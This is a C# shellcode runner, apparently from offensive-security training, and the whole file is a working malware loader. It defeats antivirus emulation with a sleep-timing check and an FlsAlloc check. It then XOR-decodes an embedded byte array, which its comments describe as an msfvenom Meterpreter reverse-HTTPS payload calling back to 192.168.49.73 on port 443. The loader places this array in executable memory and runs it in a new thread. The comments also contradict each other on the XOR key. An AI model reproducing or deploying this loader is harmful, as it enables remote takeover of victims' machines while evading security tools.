using System;
using System.Runtime.InteropServices;


namespace shellcode_runner_simple
{
    public class Program
    {

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);


        public static void Main(string[] args)
        {

            // AV bypass

            // sleep for 10 seconds

            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            // Check for non-emulated APIs
            // other checks can be added as well like VirtualAllocExNuma

            IntPtr flsresult = FlsAlloc(IntPtr.Zero);
            if (flsresult == null)
            {
                return;
            }



            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.73 LPORT=443 EXITFUNC=thread -f csharp --arch x64 --platform windows
            // for testing:
            // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f csharp --arch x64 --platform windows
            // XORed with key - 0xbb


            byte[] buf = new byte[604] { 0x00, 0xb4, 0x7f, 0x18, 0x0c, 0x14, 0x30, 0xfc, 0xfc, 0xfc, 0xbd, 0xad, 0xbd, 0xac, 0xae, 0xad, 0xb4, 0xcd, 0x2e, 0x99, 0xb4, 0x77, 0xae, 0x9c, 0xaa, 0xb4, 0x77, 0xae, 0xe4, 0xb4, 0x77, 0xae, 0xdc, 0xb4, 0x77, 0x8e, 0xac, 0xb4, 0xf3, 0x4b, 0xb6, 0xb6, 0xb1, 0xcd, 0x35, 0xb4, 0xcd, 0x3c, 0x50, 0xc0, 0x9d, 0x80, 0xfe, 0xd0, 0xdc, 0xbd, 0x3d, 0x35, 0xf1, 0xbd, 0xfd, 0x3d, 0x1e, 0x11, 0xae, 0xbd, 0xad, 0xb4, 0x77, 0xae, 0xdc, 0x77, 0xbe, 0xc0, 0xb4, 0xfd, 0x2c, 0x9a, 0x7d, 0x84, 0xe4, 0xf7, 0xfe, 0xf3, 0x79, 0x8e, 0xfc, 0xfc, 0xfc, 0x77, 0x7c, 0x74, 0xfc, 0xfc, 0xfc, 0xb4, 0x79, 0x3c, 0x88, 0x9b, 0xb4, 0xfd, 0x2c, 0xb8, 0x77, 0xbc, 0xdc, 0x77, 0xb4, 0xe4, 0xb5, 0xfd, 0x2c, 0xac, 0x1f, 0xaa, 0xb1, 0xcd, 0x35, 0xb4, 0x03, 0x35, 0xbd, 0x77, 0xc8, 0x74, 0xb4, 0xfd, 0x2a, 0xb4, 0xcd, 0x3c, 0x50, 0xbd, 0x3d, 0x35, 0xf1, 0xbd, 0xfd, 0x3d, 0xc4, 0x1c, 0x89, 0x0d, 0xb0, 0xff, 0xb0, 0xd8, 0xf4, 0xb9, 0xc5, 0x2d, 0x89, 0x24, 0xa4, 0xb8, 0x77, 0xbc, 0xd8, 0xb5, 0xfd, 0x2c, 0x9a, 0xbd, 0x77, 0xf0, 0xb4, 0xb8, 0x77, 0xbc, 0xe0, 0xb5, 0xfd, 0x2c, 0xbd, 0x77, 0xf8, 0x74, 0xbd, 0xa4, 0xb4, 0xfd, 0x2c, 0xbd, 0xa4, 0xa2, 0xa5, 0xa6, 0xbd, 0xa4, 0xbd, 0xa5, 0xbd, 0xa6, 0xb4, 0x7f, 0x10, 0xdc, 0xbd, 0xae, 0x03, 0x1c, 0xa4, 0xbd, 0xa5, 0xa6, 0xb4, 0x77, 0xee, 0x15, 0xb7, 0x03, 0x03, 0x03, 0xa1, 0xb4, 0xcd, 0x27, 0xaf, 0xb5, 0x42, 0x8b, 0x95, 0x92, 0x95, 0x92, 0x99, 0x88, 0xfc, 0xbd, 0xaa, 0xb4, 0x75, 0x1d, 0xb5, 0x3b, 0x3e, 0xb0, 0x8b, 0xda, 0xfb, 0x03, 0x29, 0xaf, 0xaf, 0xb4, 0x75, 0x1d, 0xaf, 0xa6, 0xb1, 0xcd, 0x3c, 0xb1, 0xcd, 0x35, 0xaf, 0xaf, 0xb5, 0x46, 0xc6, 0xaa, 0x85, 0x5b, 0xfc, 0xfc, 0xfc, 0xfc, 0x03, 0x29, 0x14, 0xf3, 0xfc, 0xfc, 0xfc, 0xcd, 0xc5, 0xce, 0xd2, 0xcd, 0xca, 0xc4, 0xd2, 0xc8, 0xc5, 0xd2, 0xcd, 0xc9, 0xc9, 0xfc, 0xa6, 0xb4, 0x75, 0x3d, 0xb5, 0x3b, 0x3c, 0x47, 0xfd, 0xfc, 0xfc, 0xb1, 0xcd, 0x35, 0xaf, 0xaf, 0x96, 0xff, 0xaf, 0xb5, 0x46, 0xab, 0x75, 0x63, 0x3a, 0xfc, 0xfc, 0xfc, 0xfc, 0x03, 0x29, 0x14, 0xcd, 0xfc, 0xfc, 0xfc, 0xd3, 0x97, 0xa9, 0x99, 0x98, 0x95, 0xc5, 0xc9, 0x85, 0x9a, 0xc8, 0x8f, 0xcf, 0x8b, 0x86, 0x9e, 0xbe, 0xaa, 0x91, 0xb1, 0x88, 0x86, 0xbd, 0xb8, 0xbd, 0xc5, 0x8a, 0xab, 0xb9, 0x86, 0x85, 0x95, 0xba, 0x8a, 0xbf, 0x88, 0xbb, 0x85, 0xba, 0xca, 0xb2, 0xb0, 0x94, 0x86, 0xa9, 0xc5, 0xcc, 0xa6, 0xfc, 0xb4, 0x75, 0x3d, 0xaf, 0xa6, 0xbd, 0xa4, 0xb1, 0xcd, 0x35, 0xaf, 0xb4, 0x44, 0xfc, 0xce, 0x54, 0x78, 0xfc, 0xfc, 0xfc, 0xfc, 0xac, 0xaf, 0xaf, 0xb5, 0x3b, 0x3e, 0x17, 0xa9, 0xd2, 0xc7, 0x03, 0x29, 0xb4, 0x75, 0x3a, 0x96, 0xf6, 0xa3, 0xb4, 0x75, 0x0d, 0x96, 0xe3, 0xa6, 0xae, 0x94, 0x7c, 0xcf, 0xfc, 0xfc, 0xb5, 0x75, 0x1c, 0x96, 0xf8, 0xbd, 0xa5, 0xb5, 0x46, 0x89, 0xba, 0x62, 0x7a, 0xfc, 0xfc, 0xfc, 0xfc, 0x03, 0x29, 0xb1, 0xcd, 0x3c, 0xaf, 0xa6, 0xb4, 0x75, 0x0d, 0xb1, 0xcd, 0x35, 0xb1, 0xcd, 0x35, 0xaf, 0xaf, 0xb5, 0x3b, 0x3e, 0xd1, 0xfa, 0xe4, 0x87, 0x03, 0x29, 0x79, 0x3c, 0x89, 0xe3, 0xb4, 0x3b, 0x3d, 0x74, 0xef, 0xfc, 0xfc, 0xb5, 0x46, 0xb8, 0x0c, 0xc9, 0x1c, 0xfc, 0xfc, 0xfc, 0xfc, 0x03, 0x29, 0xb4, 0x03, 0x33, 0x88, 0xfe, 0x17, 0x56, 0x14, 0xa9, 0xfc, 0xfc, 0xfc, 0xaf, 0xa5, 0x96, 0xbc, 0xa6, 0xb5, 0x75, 0x2d, 0x3d, 0x1e, 0xec, 0xb5, 0x3b, 0x3c, 0xfc, 0xec, 0xfc, 0xfc, 0xb5, 0x46, 0xa4, 0x58, 0xaf, 0x19, 0xfc, 0xfc, 0xfc, 0xfc, 0x03, 0x29, 0xb4, 0x6f, 0xaf, 0xaf, 0xb4, 0x75, 0x1b, 0xb4, 0x75, 0x0d, 0xb4, 0x75, 0x26, 0xb5, 0x3b, 0x3c, 0xfc, 0xdc, 0xfc, 0xfc, 0xb5, 0x75, 0x05, 0xb5, 0x46, 0xee, 0x6a, 0x75, 0x1e, 0xfc, 0xfc, 0xfc, 0xfc, 0x03, 0x29, 0xb4, 0x7f, 0x38, 0xdc, 0x79, 0x3c, 0x88, 0x4e, 0x9a, 0x77, 0xfb, 0xb4, 0xfd, 0x3f, 0x79, 0x3c, 0x89, 0x2e, 0xa4, 0x3f, 0xa4, 0x96, 0xfc, 0xa5, 0x47, 0x1c, 0xe1, 0xd6, 0xf6, 0xbd, 0x75, 0x26, 0x03, 0x29 };// XORed - key: 0xfc

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfc);
            }
           

            uint size = (uint)buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, size, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, (int)size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }
    }
}

